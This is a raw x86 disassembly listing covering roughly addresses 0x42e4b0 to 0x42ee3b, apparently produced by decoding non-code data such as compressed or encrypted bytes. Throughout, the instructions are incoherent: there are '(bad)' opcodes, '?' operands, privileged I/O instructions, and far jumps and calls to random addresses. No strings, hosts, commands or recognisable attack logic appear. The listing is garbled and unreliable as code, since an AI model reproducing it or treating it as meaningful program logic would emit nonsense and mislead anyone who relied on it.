  42e4b0:	arpl   dx,si
  42e4b2:	sti    
  42e4b3:	in     al,dx
  42e4b4:	mov    ch,0xa7
  42e4b6:	into   
  42e4b7:	push   esi
  42e4b8:	mov    cl,BYTE PTR [edi+0x2bbee0]
  42e4be:	push   esp
  42e4bf:	push   esi
  42e4c0:	jo     0x42e533
  42e4c2:	mov    ah,0xe9
  42e4c4:	je     0x42e4b1
  42e4c6:	mov    eax,0xe438771b
  42e4cb:	icebp  
  42e4cc:	out    0x44,al
  42e4ce:	add    al,0xa7
  42e4d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e4d1:	mov    ebx,DWORD PTR [eax+eax*2-0x2f]
  42e4d5:	bound  ecx,QWORD PTR [edx-0x55b32218]
  42e4db:	fnstsw WORD PTR [edi-0x45]
  42e4de:	sbb    dl,BYTE PTR [esi+0x4f]
  42e4e1:	test   edi,ecx
  42e4e3:	call   0x20846bdf
  42e4e8:	fbstp  TBYTE PTR [ebx-0x2fc7e0ce]
  42e4ee:	icebp  
  42e4ef:	jle    0x42e4c8
  42e4f1:	dec    esi
  42e4f2:	call   DWORD PTR [edx]
  42e4f4:	adc    al,0xe3
  42e4f6:	xchg   esi,eax
  42e4f7:	int    0x37
  42e4f9:	daa    
  42e4fa:	call   0x87f43855
  42e4ff:	scas   al,BYTE PTR es:[edi]
  42e500:	into   
  42e501:	push   edx
  42e502:	sbb    al,0x8e
  42e504:	in     eax,0xf
  42e506:	mov    bh,0xa3
  42e508:	jge    0x42e4d7
  42e50a:	mov    bl,0x11
  42e50c:	sub    bl,BYTE PTR [ebx]
  42e50e:	sub    DWORD PTR [ecx-0x7544cc97],eax
  42e514:	inc    edi
  42e515:	dec    ecx
  42e516:	adc    ebx,DWORD PTR [eax+esi*4+0xbdfe1b3]
  42e51d:	fsubr  st,st(3)
  42e51f:	out    dx,al
  42e520:	push   ecx
  42e521:	and    DWORD PTR [esp+edi*8+0x31],esp
  42e525:	lea    edx,[eax]
  42e527:	and    DWORD PTR fs:[ebx+0x5a11b12c],ecx
  42e52e:	pop    ss
  42e52f:	out    dx,eax
  42e530:	(bad)  
  42e531:	div    DWORD PTR [edx+0x26]
  42e534:	pop    ss
  42e535:	jmp    0x4ac9:0x162068d8
  42e53c:	cli    
  42e53d:	test   al,0x63
  42e53f:	shr    DWORD PTR [ecx+0x6aa0d9c0],cl
  42e545:	ss mov al,0x80
  42e548:	retf   0x1d70
  42e54b:	sbb    BYTE PTR [ebx-0x39],ah
  42e54e:	lods   eax,DWORD PTR ds:[esi]
  42e54f:	jae    0x42e4e7
  42e551:	stc    
  42e552:	and    esp,DWORD PTR [edi-0x29b7828f]
  42e558:	inc    edi
  42e559:	sub    al,0x9d
  42e55b:	mov    ch,0x85
  42e55d:	jmp    0x42e590
  42e55f:	stos   DWORD PTR es:[edi],eax
  42e560:	es mov dh,0x32
  42e563:	xor    BYTE PTR [esi-0x57535522],0xa4
  42e56a:	ss (bad) 
  42e56c:	pop    ebp
  42e56d:	add    al,0x9b
  42e56f:	aam    0xed
  42e571:	jge    0x42e51e
  42e573:	(bad)  
  42e574:	ds es push esp
  42e577:	repz ds aaa 
  42e57a:	ja     0x42e5f6
  42e57c:	and    BYTE PTR [edx+ebx*2+0x29],dl
  42e580:	sbb    DWORD PTR [edx+0xe1124ff],esp
  42e586:	mov    ?,eax
  42e588:	(bad)  
  42e58a:	bt     DWORD PTR [esi-0x75],ebx
  42e58e:	jmp    0x42e5a5
	...
  42e5f4:	push   ebp
  42e5f5:	cmp    dh,cl
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	add    ecx,DWORD PTR [edi-0xfbb8373]
  42e606:	add    DWORD PTR [eax],eax
  42e608:	add    al,0x1
  42e60a:	add    BYTE PTR [eax],al
  42e60c:	and    ah,BYTE PTR [edx-0x7178d54a]
  42e612:	gs iret 
  42e614:	mov    cl,BYTE PTR ds:0x4b1481ad
  42e61a:	push   es
  42e61b:	pop    edx
  42e61c:	lods   al,BYTE PTR ds:[esi]
  42e61d:	div    DWORD PTR [ecx]
  42e61f:	stos   BYTE PTR es:[edi],al
  42e620:	sti    
  42e621:	push   ebp
  42e622:	ret    0x4686
  42e625:	sub    eax,esi
  42e627:	cld    
  42e628:	add    eax,0x79c9e2e9
  42e62d:	jnp    0x42e614
  42e62f:	aaa    
  42e630:	mov    eax,0x6b9de67f
  42e635:	loop   0x42e5e6
  42e637:	pusha  
  42e638:	aas    
  42e639:	nop    DWORD PTR [edi-0x5e76fbb6]
  42e640:	bound  esi,QWORD PTR [esp+ebx*1-0x67]
  42e644:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e645:	cmp    dh,bl
  42e647:	imul   edx,edi,0xffffffda
  42e64a:	cmp    eax,0x2b65b15e
  42e64f:	mov    cl,BYTE PTR [eax+0x1d471d77]
  42e655:	cdq    
  42e656:	sbb    BYTE PTR [eax+0xf],0xa6
  42e65a:	fidiv  WORD PTR [ebx]
  42e65c:	das    
  42e65d:	adc    BYTE PTR [esi+eiz*4-0x4c33584d],cl
  42e664:	mov    al,0xbf
  42e666:	mov    ?,WORD PTR [ebx]
  42e668:	push   eax
  42e669:	and    DWORD PTR [esi-0x697fd869],edx
  42e66f:	aam    0x86
  42e671:	or     BYTE PTR [ecx],ch
  42e673:	inc    ecx
  42e674:	or     eax,DWORD PTR [ebp+edi*4+0x48a827d2]
  42e67b:	aad    0xd4
  42e67d:	mov    ch,0xb5
  42e67f:	out    dx,eax
  42e680:	in     eax,0xae
  42e682:	mov    ?,WORD PTR [ebx-0x48]
  42e685:	scas   al,BYTE PTR es:[edi]
  42e686:	inc    edi
  42e687:	ins    DWORD PTR es:[edi],dx
  42e688:	rol    BYTE PTR [ecx+0xf],cl
  42e68b:	aaa    
  42e68c:	jle    0x42e708
  42e68e:	scas   al,BYTE PTR es:[edi]
  42e68f:	adc    eax,0x312d6c65
  42e694:	cmp    DWORD PTR [eax+0x46168eff],ecx
  42e69a:	adc    al,0x7
  42e69c:	sub    al,0x1d
  42e69e:	jns    0x42e62f
  42e6a0:	call   0x3078287c
  42e6a5:	mov    al,ds:0xac3cb6f8
  42e6aa:	mov    ds:0xbed3df81,eax
  42e6af:	mov    DWORD PTR [eax-0x610d5ef2],ebp
  42e6b5:	jl     0x42e727
  42e6b7:	scas   eax,DWORD PTR es:[edi]
  42e6b8:	dec    ecx
  42e6b9:	cmc    
  42e6ba:	cld    
  42e6bb:	jp     0x42e6bc
  42e6bd:	xor    cl,ah
  42e6bf:	xor    DWORD PTR [ecx+eiz*8+0x7a],edx
  42e6c3:	push   edx
  42e6c4:	loopne 0x42e64c
  42e6c6:	inc    ecx
  42e6c7:	pop    edi
  42e6c8:	arpl   WORD PTR [ebx],di
  42e6ca:	ret    0xbff1
  42e6cd:	jbe    0x42e73e
  42e6cf:	adc    DWORD PTR [esi-0x32],ebp
  42e6d2:	dec    esp
  42e6d3:	imul   ebx,DWORD PTR [esi],0x191929ca
  42e6d9:	push   ss
  42e6da:	ret    
  42e6db:	adc    al,0x4c
  42e6dd:	outs   dx,BYTE PTR ds:[esi]
  42e6de:	aam    0x94
  42e6e0:	mov    al,ds:0x6fbbebd6
  42e6e5:	mov    bh,0xf2
  42e6e7:	aad    0xff
  42e6e9:	mov    dl,0x84
  42e6eb:	mov    WORD PTR [eax+edx*4+0x5c21e83f],?
  42e6f2:	xchg   cl,bl
  42e6f4:	cmp    esp,DWORD PTR [eax]
  42e6f6:	xlat   BYTE PTR ds:[ebx]
  42e6f7:	jbe    0x42e72a
  42e6f9:	jl     0x42e683
  42e6fb:	bound  ecx,QWORD PTR ds:0xa4aa9b20
  42e701:	popf   
  42e702:	out    0xf8,al
  42e704:	std    
  42e705:	in     al,0xf6
  42e707:	(bad)  
  42e708:	std    
  42e709:	popa   
  42e70a:	sbb    eax,0x7b85fa13
  42e70f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fidiv  DWORD PTR [esi+0x4886427f]
  42e785:	icebp  
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	xchg   BYTE PTR [ecx+0x16],dh
  42e78f:	test   eax,0xf30bd6ae
  42e794:	mov    ah,BYTE PTR [edi]
  42e796:	into   
  42e797:	mov    ebp,0x698f8acc
  42e79c:	mov    ah,al
  42e79e:	xor    eax,0x9ab6e417
  42e7a3:	aas    
  42e7a4:	in     eax,dx
  42e7a5:	and    bh,BYTE PTR [edi]
  42e7a7:	xor    bh,BYTE PTR [ecx+0x6f39598a]
  42e7ad:	xlat   BYTE PTR ds:[ebx]
  42e7ae:	fsubr  st,st(5)
  42e7b0:	add    eax,0xe19effe8
  42e7b5:	loopne 0x42e746
  42e7b7:	rcr    BYTE PTR [ebx-0x5d],1
  42e7ba:	hlt    
  42e7bb:	cmp    BYTE PTR [ebx+0x4e],dl
  42e7be:	adc    al,0xe2
  42e7c0:	ss aam 0x3b
  42e7c3:	and    al,0x36
  42e7c5:	mov    DWORD PTR [esi-0x3104942a],0x25bcc796
  42e7cf:	mov    WORD PTR [eax-0x3d33e59],gs
  42e7d5:	(bad)  [esi+0x4d768ec7]
  42e7db:	inc    esp
  42e7dc:	jle    0x42e792
  42e7de:	cli    
  42e7df:	pop    edx
  42e7e0:	xchg   esi,eax
  42e7e1:	and    al,0x3f
  42e7e3:	pop    edx
  42e7e4:	xor    DWORD PTR [ecx-0x244b241b],edi
  42e7ea:	sti    
  42e7eb:	sub    BYTE PTR [edi],0xe5
  42e7ee:	dec    esi
  42e7ef:	pop    esi
  42e7f0:	push   ebx
  42e7f1:	mov    edx,0x1b79d3e9
  42e7f6:	sar    DWORD PTR [ecx+ecx*8+0x1585fb0e],1
  42e7fd:	jmp    0x42e815
  42e7ff:	push   edx
  42e800:	aas    
  42e801:	pushf  
  42e802:	jmp    0x42e790
  42e804:	callw  0x5c9b
  42e808:	cmc    
  42e809:	push   cs
  42e80a:	mov    dl,0x71
  42e80c:	push   es
  42e80d:	fcmovnbe st,st(4)
  42e80f:	jmp    0xd046:0xb8a2f43a
  42e816:	adc    edi,DWORD PTR [ebx]
  42e818:	inc    edi
  42e819:	lock pop ebp
  42e81b:	enter  0xdc27,0xf4
  42e81f:	cmp    ah,BYTE PTR [edi*4+0x2b5250d1]
  42e826:	sub    esp,DWORD PTR [edi+0x1ee662cb]
  42e82c:	mov    al,0x55
  42e82e:	es inc esp
  42e830:	pop    ss
  42e831:	sub    BYTE PTR [ebx+0x2eeccdf8],al
  42e837:	dec    esi
  42e838:	(bad)  
  42e839:	icebp  
  42e83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e83b:	mov    DWORD PTR [ebp+0x67285a85],esp
  42e841:	or     al,0xfe
  42e843:	mov    eax,0xaf5aee27
  42e848:	dec    ebp
  42e849:	shl    esi,1
  42e84b:	scas   al,BYTE PTR es:[edi]
  42e84c:	xor    al,0x47
  42e84e:	or     ebp,ecx
  42e850:	ja     0x42e848
  42e852:	clc    
  42e853:	imul   ebx,DWORD PTR [esi-0x3edd9ebe],0x6c
  42e85a:	push   ss
  42e85b:	icebp  
  42e85c:	cmp    edx,ebp
  42e85e:	pop    esi
  42e85f:	sub    BYTE PTR [edi-0x47],al
  42e862:	sahf   
  42e863:	(bad)  
  42e864:	mov    ebx,0x338cfc9
  42e869:	(bad)  
  42e86a:	call   0x97bb8ac8
  42e86f:	outs   dx,BYTE PTR ds:[esi]
  42e870:	arpl   ax,bx
  42e872:	jmp    0x42e86e
  42e874:	jae    0x42e876
  42e876:	and    BYTE PTR [esi+0x72707ce],ah
  42e87c:	call   0xcf86:0xd7728dcf
  42e883:	test   eax,0x7fad57ac
  42e888:	push   edx
  42e889:	in     al,0x1a
  42e88b:	les    edi,FWORD PTR ds:0xfa292e
	...
  42e8f1:	add    BYTE PTR [eax],al
  42e8f3:	add    bl,al
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx+0xf23f82b]
  42e901:	sbb    BYTE PTR es:[edx+0x1f24c],0x4
  42e909:	add    DWORD PTR [eax],eax
  42e90b:	add    bh,bh
  42e90d:	mov    dl,0x7b
  42e90f:	lds    edi,FWORD PTR [ebx+0x77]
  42e912:	sub    bl,BYTE PTR [edx-0x39]
  42e915:	ins    BYTE PTR es:[edi],dx
  42e916:	pushf  
  42e917:	and    al,cl
  42e919:	dec    ecx
  42e91a:	mov    esp,0xe9efed15
  42e91f:	call   0x197e:0x577618fa
  42e926:	adc    ebp,esp
  42e928:	and    al,0x2f
  42e92a:	push   edx
  42e92b:	loope  0x42e938
  42e92d:	into   
  42e92e:	sub    DWORD PTR [esi],0x3a
  42e931:	cmc    
  42e932:	sub    bh,bh
  42e934:	gs jnp 0x42e992
  42e937:	xchg   BYTE PTR [ebx-0x4e],cl
  42e93a:	jp     0x42e9af
  42e93c:	xor    al,0xba
  42e93e:	ss push ecx
  42e940:	jmp    0x42e94f
  42e942:	es fucompp 
  42e945:	add    ch,BYTE PTR [edi+0xe]
  42e948:	popa   
  42e949:	add    edx,ebp
  42e94b:	pop    ecx
  42e94c:	mov    edi,0x33f128cc
  42e951:	pop    es
  42e952:	add    BYTE PTR [eax],ah
  42e954:	push   es
  42e955:	mov    bh,0x70
  42e957:	cmp    BYTE PTR [ebx-0x7a],dh
  42e95a:	pop    es
  42e95b:	test   al,0x25
  42e95d:	bound  ebp,QWORD PTR [ebp+0x2b6f9b68]
  42e963:	int3   
  42e964:	sbb    dl,dh
  42e966:	retf   
  42e967:	jbe    0x42e91c
  42e969:	push   0xc31040b9
  42e96e:	fisttp WORD PTR [ecx]
  42e970:	inc    edi
  42e971:	mov    al,ds:0x6937da69
  42e976:	mov    bh,0x42
  42e978:	mov    bl,0x41
  42e97a:	sti    
  42e97b:	xor    edx,edx
  42e97d:	or     ebp,DWORD PTR [edi+0x5073c724]
  42e983:	jnp    0x42e9a7
  42e985:	shrd   DWORD PTR [ecx-0x5cea64c8],edi,cl
  42e98c:	inc    edi
  42e98d:	mov    edx,0x3a2f58ef
  42e992:	jne    0x42e9ae
  42e994:	fsub   QWORD PTR [edi-0x78]
  42e997:	xor    al,0x2d
  42e999:	inc    edx
  42e99a:	xor    DWORD PTR [edx+0x60a98049],ebp
  42e9a0:	xchg   ebx,eax
  42e9a1:	mov    edx,0xf8d361c7
  42e9a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9a7:	or     al,al
  42e9a9:	popa   
  42e9aa:	mov    DWORD PTR [eax+0x3566547d],0xd720485d
  42e9b4:	pop    ds
  42e9b5:	outs   dx,DWORD PTR ds:[esi]
  42e9b6:	sbb    edx,DWORD PTR [ecx-0x62]
  42e9b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e9ba:	sbb    al,0xaf
  42e9bc:	mov    edi,0x8a99135a
  42e9c1:	pop    ebx
  42e9c2:	pop    ss
  42e9c3:	cs in  al,0x67
  42e9c6:	xchg   DWORD PTR [edi],edi
  42e9c8:	hlt    
  42e9c9:	adc    DWORD PTR [edx+ebp*1],edi
  42e9cc:	pop    ebx
  42e9cd:	lock jne 0x42e969
  42e9d0:	jb     0x42e9d7
  42e9d2:	cld    
  42e9d3:	inc    ebp
  42e9d4:	ror    ebp,0x97
  42e9d7:	sub    DWORD PTR [ebx],0xb
  42e9da:	sti    
  42e9db:	in     eax,0xed
  42e9dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e9de:	aas    
  42e9df:	xchg   edi,eax
  42e9e0:	ret    
  42e9e1:	jge    0x42e9f3
  42e9e3:	xchg   esp,eax
  42e9e4:	gs ds pop ss
  42e9e7:	xor    BYTE PTR [edx+ecx*4-0x6e],dl
  42e9eb:	hlt    
  42e9ec:	mov    dl,0x9b
  42e9ee:	xchg   ecx,eax
  42e9ef:	mov    ds:0x4fe2c482,eax
  42e9f4:	lock add al,0x7f
  42e9f7:	mov    ebp,0x83d502a2
  42e9fc:	popf   
  42e9fd:	test   al,0x2f
  42e9ff:	adc    esp,DWORD PTR [ecx-0x7942f4d8]
  42ea05:	inc    ebp
  42ea06:	mov    ch,0x78
  42ea08:	xor    DWORD PTR [ebx],ecx
  42ea0a:	push   esp
  42ea0b:	imul   ecx,esp,0xbee632
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	cmp    bl,bl
  42ea82:	repnz int 0x50
  42ea85:	repz add DWORD PTR [eax],eax
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	cmc    
  42ea8d:	or     al,0x8b
  42ea8f:	jno    0x42ea70
  42ea91:	push   ebp
  42ea92:	retf   
  42ea93:	repz in al,0x87
  42ea96:	xor    al,BYTE PTR [ebx]
  42ea98:	fdiv   QWORD PTR [eax+0x1f]
  42ea9b:	push   ebx
  42ea9c:	mov    cl,0xc7
  42ea9e:	xor    edi,DWORD PTR [esp+ebx*2+0x3b9fad7]
  42eaa5:	imul   ebx,esp,0xf889e880
  42eaab:	fwait
  42eaac:	push   esi
  42eaad:	dec    ecx
  42eaae:	mov    edi,0xd605d74a
  42eab3:	mov    bh,0xeb
  42eab5:	sub    BYTE PTR [eax],cl
  42eab7:	fdivr  st,st(4)
  42eab9:	cld    
  42eaba:	add    edi,DWORD PTR [edx-0x4d]
  42eabd:	sub    BYTE PTR [ebp+0x28d39d1],ch
  42eac3:	test   al,0x44
  42eac5:	and    eax,0xe405434b
  42eaca:	pusha  
  42eacb:	not    BYTE PTR [edi]
  42eacd:	inc    ebp
  42eace:	lods   al,BYTE PTR ds:[esi]
  42eacf:	cmp    eax,0x69bc0e25
  42ead4:	mov    dl,al
  42ead6:	pop    eax
  42ead7:	jg     0x42eab4
  42ead9:	mov    ecx,0x81d8322
  42eade:	popf   
  42eadf:	adc    esp,ecx
  42eae1:	pop    ebx
  42eae2:	mov    edx,0x7b6f8c28
  42eae7:	xabort 0xed
  42eaea:	mov    ebp,0x8c533529
  42eaef:	jmp    0x42eaa1
  42eaf1:	mov    dh,0xa
  42eaf3:	pop    ds
  42eaf4:	dec    edi
  42eaf5:	inc    esp
  42eaf6:	inc    edx
  42eaf7:	dec    eax
  42eaf8:	sbb    DWORD PTR [eax+0x5e],edi
  42eafb:	jbe    0x42eb79
  42eafd:	stc    
  42eafe:	xchg   esi,eax
  42eaff:	es add dl,dl
  42eb02:	mov    ebx,edi
  42eb04:	xor    bh,BYTE PTR [edx+0x16dd002]
  42eb0a:	xchg   ebx,eax
  42eb0b:	arpl   WORD PTR [ebp-0x1d],bp
  42eb0e:	sahf   
  42eb0f:	mov    al,ds:0x143286fd
  42eb14:	(bad)  
  42eb15:	cmp    DWORD PTR [edx-0x39b5d4ca],ebp
  42eb1b:	retf   
  42eb1c:	retf   
  42eb1d:	inc    ecx
  42eb1e:	in     eax,0x9f
  42eb20:	mov    eax,ds:0x5d23424f
  42eb25:	push   edi
  42eb26:	scas   al,BYTE PTR es:[edi]
  42eb27:	jle    0x42eb38
  42eb29:	repz call 0x729148f2
  42eb2f:	push   ecx
  42eb30:	jns    0x42eb91
  42eb32:	add    dh,BYTE PTR ds:0xddb5c204
  42eb38:	iret   
  42eb39:	mov    eax,ds:0x5d8e124c
  42eb3e:	test   BYTE PTR [edi-0x71],0x88
  42eb42:	test   BYTE PTR [esi+0x67cabadc],0x84
  42eb49:	stos   DWORD PTR es:[edi],eax
  42eb4a:	fisub  DWORD PTR [edx]
  42eb4c:	adc    al,0x98
  42eb4e:	cmp    BYTE PTR [ebp+0x47],bl
  42eb51:	hlt    
  42eb52:	mov    ebx,0x27c70476
  42eb57:	(bad)  
  42eb59:	sbb    ah,BYTE PTR [esi]
  42eb5b:	and    edx,DWORD PTR [esi-0x2b]
  42eb5e:	pop    edx
  42eb5f:	mov    BYTE PTR [ebx+ebp*4+0x7d],bh
  42eb63:	inc    esp
  42eb64:	out    0xc9,al
  42eb66:	in     al,0xf2
  42eb68:	jbe    0x42eb0b
  42eb6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb6b:	dec    esi
  42eb6c:	push   0x8989f77d
  42eb71:	mov    edi,DWORD PTR [esi-0x433695a5]
  42eb77:	pop    es
  42eb78:	xor    BYTE PTR ds:0x168738d6,al
  42eb7e:	aaa    
  42eb7f:	jle    0x42eb14
  42eb81:	sahf   
  42eb82:	clc    
  42eb83:	fld    TBYTE PTR [edi]
  42eb85:	fmul   st,st(1)
  42eb87:	ret    0x8c45
  42eb8a:	sbb    eax,0x31f9b78a
  42eb8f:	icebp  
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	or     DWORD PTR [ecx+0x65],0xf45442d7
  42ec06:	add    DWORD PTR [eax],eax
  42ec08:	add    al,0x1
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	int    0x9b
  42ec0e:	in     eax,0xd5
  42ec10:	jae    0x42ec4b
  42ec12:	dec    edx
  42ec13:	push   es
  42ec14:	sub    al,0xb7
  42ec16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ec17:	sub    al,bl
  42ec19:	and    BYTE PTR [ebx+edx*8],bl
  42ec1c:	mov    dh,0x2c
  42ec1e:	xchg   edi,eax
  42ec1f:	ins    DWORD PTR es:[edi],dx
  42ec20:	js     0x42ec00
  42ec22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec23:	and    cl,BYTE PTR [edx+ecx*4-0x4647ba01]
  42ec2a:	popf   
  42ec2b:	enter  0x5dc3,0xe1
  42ec2f:	mov    DWORD PTR [esi-0x21d39ba1],edi
  42ec35:	inc    ebx
  42ec36:	aam    0x6e
  42ec38:	add    DWORD PTR [esi-0x5d930deb],eax
  42ec3e:	sub    DWORD PTR [ecx+0x373a6965],esi
  42ec44:	or     eax,0x3ae540c6
  42ec49:	mov    ebp,0xbbeaf7c6
  42ec4e:	jnp    0x42ec7a
  42ec50:	and    al,0xa5
  42ec52:	out    0x4b,eax
  42ec54:	mov    ds:0x9d04ab2a,al
  42ec59:	fprem  
  42ec5b:	adc    al,0xa4
  42ec5d:	or     BYTE PTR [ebx+0x2993a3d4],dl
  42ec63:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  42ec65:	sub    BYTE PTR [eax],0xee
  42ec68:	into   
  42ec69:	ror    DWORD PTR [esi],cl
  42ec6b:	push   0x7a
  42ec6d:	fs mov dh,0x67
  42ec70:	xchg   ebx,eax
  42ec71:	inc    ecx
  42ec72:	jb     0x42ecaf
  42ec74:	dec    edx
  42ec75:	push   esp
  42ec76:	loope  0x42ecd5
  42ec78:	push   cs
  42ec79:	jecxz  0x42ec40
  42ec7b:	xchg   esp,eax
  42ec7c:	pop    ebx
  42ec7d:	das    
  42ec7e:	shl    DWORD PTR [eax-0x4937c4f0],cl
  42ec84:	cmp    esi,DWORD PTR [edi]
  42ec86:	adc    BYTE PTR [edi],0x89
  42ec89:	cmp    bh,dl
  42ec8b:	in     al,0x5e
  42ec8d:	jl     0x42ecb9
  42ec8f:	adc    DWORD PTR [esi+0x1f8e5380],esp
  42ec95:	into   
  42ec96:	inc    edx
  42ec97:	cdq    
  42ec98:	adc    eax,0xcca3d4d4
  42ec9d:	adc    ebp,DWORD PTR [eax-0xd]
  42eca0:	mov    ds:0xaeabce86,eax
  42eca5:	inc    esi
  42eca6:	mov    db2,edi
  42eca9:	sbb    edx,DWORD PTR [edx+0x5a]
  42ecac:	sbb    DWORD PTR gs:[eax-0x70],edi
  42ecb0:	fsubr  QWORD PTR [ecx-0x6b]
  42ecb3:	lock sbb al,0x3b
  42ecb6:	or     al,0x1c
  42ecb8:	dec    edx
  42ecb9:	adc    dh,ah
  42ecbb:	xor    esi,ecx
  42ecbd:	dec    edx
  42ecbe:	dec    ebx
  42ecbf:	sub    DWORD PTR [eax+0x44],esp
  42ecc2:	popf   
  42ecc3:	inc    BYTE PTR [esi-0x63b83ded]
  42ecc9:	or     BYTE PTR [eax+0x3c],ch
  42eccc:	ret    0x7e41
  42eccf:	ret    
  42ecd0:	in     al,0x40
  42ecd2:	jmp    0x42ecac
  42ecd4:	(bad)  
  42ecd5:	push   esp
  42ecd6:	lods   eax,DWORD PTR ds:[esi]
  42ecd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecd8:	stc    
  42ecd9:	add    ch,0x9e
  42ecdc:	jns    0x42ec60
  42ecde:	mov    ch,0xf9
  42ece0:	sub    DWORD PTR [edx-0x16],ebx
  42ece3:	(bad)  [esi+0x78ecac77]
  42ece9:	add    BYTE PTR [ecx+0x11],0x95
  42eced:	loope  0x42ec8e
  42ecef:	pushf  
  42ecf0:	sbb    ebx,DWORD PTR [eax+0x45]
  42ecf3:	inc    ebx
  42ecf4:	jns    0x42ecb0
  42ecf6:	dec    ebx
  42ecf7:	mov    ecx,0x884b823d
  42ecfc:	icebp  
  42ecfd:	dec    eax
  42ecfe:	and    ebx,ebx
  42ed00:	push   esp
  42ed01:	ja     0x42ed5d
  42ed03:	mov    ds,WORD PTR [edx-0x57]
  42ed06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed07:	in     eax,0xf2
  42ed09:	sbb    al,BYTE PTR [edi]
  42ed0b:	rcl    BYTE PTR [edx],cl
  42ed0d:	fs push 0xad
	...
  42ed73:	add    BYTE PTR [edx],ch
  42ed75:	imul   BYTE PTR [edi+0x7fd9ffd8]
  42ed7b:	mul    bl
  42ed7d:	xor    al,BYTE PTR [ebp+0x621b22a2]
  42ed83:	loop   0x42eddd
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	mov    esi,0xeceb85e3
  42ed91:	rol    BYTE PTR [edx],cl
  42ed93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ed94:	fisub  WORD PTR [ebp-0x32e19b6c]
  42ed9a:	stos   DWORD PTR es:[edi],eax
  42ed9b:	adc    al,0xd3
  42ed9d:	cmp    al,0xfc
  42ed9f:	in     al,dx
  42eda0:	xchg   esp,eax
  42eda1:	mov    DWORD PTR [edi],ebx
  42eda3:	or     eax,0x7632af90
  42eda8:	and    esi,edi
  42edaa:	sub    al,0xa5
  42edac:	pop    ss
  42edad:	cmc    
  42edae:	ret    
  42edaf:	add    ebx,DWORD PTR [edi]
  42edb1:	push   ebx
  42edb2:	cdq    
  42edb3:	fld    TBYTE PTR [edx-0x30fc0103]
  42edb9:	jmp    0x603b:0xc6b2c7dd
  42edc0:	jg     0x42ed75
  42edc2:	out    dx,eax
  42edc3:	adc    ebp,edx
  42edc5:	(bad)  
  42edc6:	xchg   edi,eax
  42edc7:	outs   dx,BYTE PTR ds:[esi]
  42edc8:	push   ds
  42edc9:	pop    eax
  42edca:	aam    0x96
  42edcc:	sub    ebp,DWORD PTR [edi+0x2f37c14c]
  42edd2:	stos   BYTE PTR es:[edi],al
  42edd3:	mov    ebp,0x2fb81bd6
  42edd8:	hlt    
  42edd9:	and    esp,DWORD PTR [ecx+0x7a8c8357]
  42eddf:	xchg   ebx,eax
  42ede0:	push   0xffffffd6
  42ede2:	in     eax,dx
  42ede3:	jmp    0x42edf3
  42ede5:	add    al,bh
  42ede7:	pop    es
  42ede8:	mov    dh,0xc3
  42edea:	or     DWORD PTR [ebx],0x29
  42eded:	push   ss
  42edee:	out    0xfe,al
  42edf0:	xchg   edx,eax
  42edf1:	jmp    0xdc27:0xb7c51017
  42edf8:	iret   
  42edf9:	fcom   DWORD PTR [edi+edx*4]
  42edfc:	and    BYTE PTR [ebx+0x21],al
  42edff:	adc    cl,dl
  42ee01:	aam    0x27
  42ee03:	or     DWORD PTR [ebx+ebx*1],ebx
  42ee06:	(bad)  
  42ee07:	adc    edi,DWORD PTR [ebp-0x72817620]
  42ee0d:	xchg   edx,eax
  42ee0e:	cli    
  42ee0f:	pop    ebp
  42ee10:	and    BYTE PTR [esi-0x80],cl
  42ee13:	out    dx,eax
  42ee14:	dec    ecx
  42ee15:	push   esp
  42ee16:	sub    esi,edx
  42ee18:	dec    ecx
  42ee19:	xlat   BYTE PTR ds:[ebx]
  42ee1a:	scas   eax,DWORD PTR es:[edi]
  42ee1b:	scas   eax,DWORD PTR es:[edi]
  42ee1c:	jo     0x42edff
  42ee1e:	mov    dl,0xa9
  42ee20:	out    dx,al
  42ee21:	push   edi
  42ee22:	outs   dx,DWORD PTR ds:[esi]
  42ee23:	xor    BYTE PTR [ecx+edi*1-0x7133ef9a],al
  42ee2a:	dec    esi
  42ee2b:	inc    ebp
  42ee2c:	pusha  
  42ee2d:	jo     0x42eea1
  42ee2f:	xchg   ebp,eax
  42ee30:	adc    BYTE PTR [eax+0x1a],al
  42ee33:	ins    DWORD PTR es:[edi],dx
  42ee34:	loopne 0x42ee6e
  42ee36:	dec    ecx
  42ee37:	inc    eax
  42ee38:	jecxz  0x42ee3c
  42ee3a:	popf   
  42ee3b:	jecxz  0x42ee7b
